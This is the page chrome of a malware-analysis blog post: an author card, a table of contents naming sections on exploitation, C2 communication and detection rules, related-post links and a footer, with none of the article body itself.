<a href=https://c3rb3ru5d3d53c.github.io/tags/analysis/ class="inline-block bg-tertiary-bg text-sm rounded px-3 py-1 my-1 me-2 hover:text-eureka">#analysis</a></div><div class=py-2><div class="my-8 flex flex-col items-center md:flex-row"><a href=https://c3rb3ru5d3d53c.github.io/authors/c3rb3ru5d3d53c/ class="md:me-4 text-primary-text h-24 w-24"><img src=https://c3rb3ru5d3d53c.github.io/images/profile.jpg class="bg-primary-bg w-full rounded-full" alt=Avatar></a><div class="mt-4 w-full md:mt-0 md:w-auto"><a href=https://c3rb3ru5d3d53c.github.io/authors/c3rb3ru5d3d53c/ class="mb-2 block border-b pb-1 text-lg font-bold"><h3>c3r3b3ru5d3d53c</h3></a><span class="block pb-2">I have acquired over my career, skills that make me a nightmare for threat actors.</span>
<a href=mailto:c3rb3ru5d3d53c@gmail.com class=me-2><i class="fas fa-envelope"></i></a>
<a href=https://twitter.com/c3rb3ru5d3d53c class=me-2><i class="fab fa-twitter"></i></a>
<a href=https://github.com/c3rb3ru5d3d53c class=me-2><i class="fab fa-github"></i></a>
<a href=https://www.youtube.com/channel/UCk9BugRahSWgPLYOAA3QH4w class=me-2><i class="fab fa-youtube"></i></a></div></div></div><div class="-mx-2 mt-4 flex flex-col border-t px-2 pt-4 md:flex-row md:justify-between"><div></div><div class="mt-4 md:mt-0 md:text-right"><span class="text-primary-text block font-bold">Next</span>
<a href=https://c3rb3ru5d3d53c.github.io/malware-blog/2020-02-12-qakbot-downloader/ class=block>Qakbot/QBot Downloader</a></div></div></div><div class=col-span-2><div class="bg-primary-bg
prose sticky top-16 z-10 hidden px-6 py-4 lg:block"><h3>On This Page</h3></div><div class="sticky-toc hidden px-6 pb-6 lg:block"><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#analysis>Analysis</a><ul><li><a href=#situational-awareness>Situational Awareness</a></li><li><a href=#infection-chain>Infection Chain</a></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#extracting-shellcode>Extracting Shellcode</a></li><li><a href=#shellcode-analysis>Shellcode Analysis</a></li></ul></li><li><a href=#post-exploitation>Post Exploitation</a><ul><li><a href=#msi-installer>MSI Installer</a></li><li><a href=#payload-triage>Payload Triage</a></li><li><a href=#initialization>Initialization</a></li><li><a href=#persistence>Persistence</a></li><li><a href=#c2-communication>C2 Communication</a><ul><li><a href=#behavior>Behavior</a></li><li><a href=#c2-responses>C2 Responses</a></li><li><a href=#c2-server-code>C2 Server Code</a></li><li><a href=#proof-of-concept-poc>Proof of Concept (PoC)</a></li><li><a href=#summary>Summary</a></li></ul></li></ul></li></ul></li><li><a href=#configuration-extraction>Configuration Extraction</a></li><li><a href=#classification>Classification</a></li><li><a href=#conclusion>Conclusion</a></li><li><a href=#downloads>Downloads</a></li><li><a href=#indicators>Indicators</a><ul><li><a href=#static>Static</a></li><li><a href=#ttps>TTPs</a></li><li><a href=#graph>Graph</a></li></ul></li><li><a href=#detection>Detection</a><ul><li><a href=#yara>YARA</a></li><li><a href=#suricata>Suricata</a></li><li><a href=#sigma>Sigma</a></li></ul></li><li><a href=#references>References</a></li></ul></nav></div><script>window.addEventListener("DOMContentLoaded",()=>{enableStickyToc()})</script></div><div class="bg-secondary-bg prose col-span-2 rounded p-6 lg:col-span-6"><h3>See Also</h3><a href=https://c3rb3ru5d3d53c.github.io/docs/cheatsheet/ class=no-underline>CheatSheet</a><br><a href=https://c3rb3ru5d3d53c.github.io/docs/malware-analysis-beginner-guide/ class=no-underline>Malware Analysis for Beginners</a><br><a href=https://c3rb3ru5d3d53c.github.io/docs/kvm-malware-lab/ class=no-underline>KVM Malware Lab Guide</a><br><a href=https://c3rb3ru5d3d53c.github.io/malware-blog/2020-02-12-qakbot-downloader/ class=no-underline>Qakbot/QBot Downloader</a><br><a href=https://c3rb3ru5d3d53c.github.io/malware-blog/2020-02-10-vjw0rm-vipersoftx-variant/ class=no-underline>ViperSoftx Vjw0rm Variant</a><br><a href=https://c3rb3ru5d3d53c.github.io/malware-blog/2020-02-01-vjw0rm-mr-robot-variant/ class=no-underline>Mr. Robot Variant of Vjw0rm</a><br></div></div><script>document.addEventListener("DOMContentLoaded",()=>{hljs.highlightAll()})</script></div></div></main><footer class=pl-scrollbar><div class="mx-auto w-full max-w-screen-xl"><div class="text-center p-6 pin-b"><p class="text-sm text-tertiary-text">&copy; 2022 <a href=https://twitter.com/c3rb3ru5d3d53c>c3rb3ru5d3d53c</a>
&#183; Powered by the <a href=https://github.com/wangchucheng/hugo-eureka class=hover:text-eureka>Eureka</a> theme for <a href=https://gohugo.io class=hover:text-eureka>Hugo</a></p></div></div></footer></body></html>